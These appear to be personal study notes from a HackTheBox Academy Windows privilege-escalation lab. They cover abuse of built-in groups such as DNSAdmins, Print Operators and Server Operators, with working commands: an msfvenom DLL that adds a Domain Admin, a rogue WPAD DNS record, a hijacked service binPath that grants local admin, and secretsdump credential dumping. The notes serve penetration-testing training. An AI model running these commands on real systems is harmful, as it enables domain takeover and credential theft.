# Group Privileges
- Built-in groups are groups that are shipped with the operating system or get added when active directory domain services role is installed on system to promote a server to a Domain Controller
## Event Log Reader
 
```Powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
```
|Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```


## DNSAdmins Group

**Checks whether you are part of the group** 
```
Get-ADGroupMember -Identity DnsAdmins

```

**Create payload**
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll <----
```
**Transfer to Machine** 

**Run the dnscmd.exe**
```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
**Run netstart and net stop**
```
net start
net stop
```
**Verify**
```
net group "Domain Admins" /dom
```

**WPAD Record**: A method used by clients to locate URI of a configuration file using DHCP and/or DNS discovery methods 
```Powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

- for some reason sc.exe query dns works well but sc query dns does not work 

>[!NOTE] 
>Recommended to use CMD, not powershell 
>Recs also include using net start and net stop instead of sc.exe start dns https://forum.hackthebox.com/t/htb-academy-windows-privilege-escalation-dnsadmins/243482/31

## Hyper-V Administrators

- have access to all hyper v features 
- if domain controllers have been virtualized, then virtualization admins should be considered domain admins 
- deleting virtual machine attempts to restore original file permissions on corresponding .vhdx file 
## Print Operators
- Grants SeLoadDriverPrivilege, which is ability to to administer/connect/disconnect printers as well as login to domain controller
```
 wget https://github.com/JoshMorrison99/SeLoadDriverPrivilege #transfer to windows system 
```


##  Server Operators 
- Grants SeBackupPrivilege and SeRestorePrivilege 
- SeBackupPrivilege

**Enumeration**
```
sc qc AppReadiness 
```

```Powershell
Get-Service -Name AppReadiness | Select-Object *

```

```Powershell
c:\Tools\PsService.exe security AppReadiness 

```
**Payload/Priv Esc**

> [!NOTE] Payload Consideration
> All of what is mentioned below is REQUIRED to get this to work, none of it is not important 

```
sc config AppReadiness binPath="cmd /c net localgroup Administrators server_adm /add"
sc start AppReadinesss 
net localgroup Administrators 

```

- AppReadiness is misconfigured to allow Server Operators full control and let them change how a service starts 
-  Only possible if someon has service_all_access

**Data Exfilitration**

```bash
secretsdump.py server_adm@10.129.43.42
```
